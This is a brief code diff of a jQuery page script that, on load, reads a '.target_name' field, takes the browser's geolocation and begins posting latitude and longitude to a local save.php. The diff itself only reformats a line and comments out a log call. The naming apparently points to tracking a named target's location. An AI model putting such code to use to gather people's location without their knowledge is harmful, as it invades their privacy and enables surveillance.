@@ -2,9 +2,9 @@
 
 $(document).ready(function(){  
 //location
-    var name=$(".target_name").val();
+   var name=$(".target_name").val();
     const successCallback=(position)=>{
-        console.log(position.coords);
+        // console.log(position.coords);
         var lat=position.coords.latitude;
         var long=position.coords.longitude;
         $.post("./save.php",
